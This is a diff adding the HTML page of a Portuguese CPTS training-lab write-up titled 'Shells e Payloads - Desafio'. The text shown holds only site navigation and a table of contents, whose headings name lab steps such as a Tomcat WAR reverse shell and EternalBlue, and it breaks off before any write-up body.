@@ -1,0 +1,2345 @@
+
+<!doctype html>
+<html lang="pt" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups do curso preparatório CPTS">
+      
+      
+        <meta name="author" content="Matheus Navarro de Franca">
+      
+      
+        <link rel="canonical" href="https://thewzz.github.io/cpts-writeups/machines/shells-e-payloads-desafio/">
+      
+      
+        <link rel="prev" href="../footprinting-tests-medium/">
+      
+      
+        <link rel="next" href="../footprinting-tests-hard/">
+      
+      
+        
+          <link rel="alternate" href="./" hreflang="pt-BR">
+        
+          <link rel="alternate" href="../../en/machines/shells-e-payloads-desafio/" hreflang="en">
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Shells e Payloads - Desafio - CPTS Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/home.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#shells-e-payloads-desafio" class="md-skip">
+          Pular para conteúdo
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeçalho">
+    <a href="../.." title="CPTS Writeups" class="md-header__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CPTS Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Shells e Payloads - Desafio
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Selecione o idioma">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="./" hreflang="pt-BR" class="md-select__link">
+              Português (BR)
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="../../en/machines/shells-e-payloads-desafio/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Buscar" placeholder="Buscar" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Pesquisar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando busca
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegação" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CPTS Writeups" class="md-nav__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CPTS Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Máquinas
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Máquinas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Índice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concluídos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Concluídos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_1" id="__nav_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../getting-started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-easy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_2" id="__nav_1_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Medium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-medium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Medium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shells e Payloads - Desafio
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shells e Payloads - Desafio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Índice">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Índice
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacoes-gerais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 Informações Gerais
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Enumeração Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 Enumeração Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#credenciais-encontradas-no-host-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credenciais encontradas no host de entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#portas-e-servicos-encontrados-17216113" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portas e Serviços Encontrados (172.16.1.13)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descobertas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descobertas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-utilizadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Técnicas Utilizadas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploracao-acesso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 Exploração / Acesso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploração / Acesso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vetor-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vetor de Entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-1-tomcat-shells-winsvr-war-malicioso-shell-reversa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 1 — Tomcat (shells-winsvr): WAR malicioso → shell reversa
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-2-blog-shells-nixsvr-rce-autenticado-via-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 2 — Blog (shells-nixsvr): RCE autenticado via Metasploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-3-shells-winblue-17216113-iis-webshell-antak" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 3 — SHELLS-WINBLUE (172.16.1.13): IIS → webshell Antak
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-4-shells-winblue-eternalblue-ms17-010" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 4 — SHELLS-WINBLUE: EternalBlue (MS17-010)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-e-pos-acesso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🐚 Shell e Pós-Acesso
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🐚 Shell e Pós-Acesso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeracao-em-shells-nixsvr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeração em shells-nixsvr
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resumo-de-acessos-obtidos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resumo de acessos obtidos
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚩 Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-tecnico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 Resumo Técnico
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#licoes-aprendidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 Lições Aprendidas
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_3" id="__nav_1_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hard
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hard
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-hard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Hard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Em Andamento
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Em Andamento
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3_1" id="__nav_1_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../silentium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silentium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../facts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Facts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anotações
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Anotações
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Estudos Footprinting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Estudos Footprinting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/smb-client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMB Client
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/oracle-tns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ORACLE TNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/ipmi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IPMI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Índice">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Índice
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacoes-gerais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 Informações Gerais
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Enumeração Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 Enumeração Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#credenciais-encontradas-no-host-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credenciais encontradas no host de entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#portas-e-servicos-encontrados-17216113" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portas e Serviços Encontrados (172.16.1.13)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descobertas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descobertas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-utilizadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Técnicas Utilizadas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploracao-acesso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 Exploração / Acesso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploração / Acesso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vetor-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vetor de Entrada
+      
+    </span>
+  </a>
+  
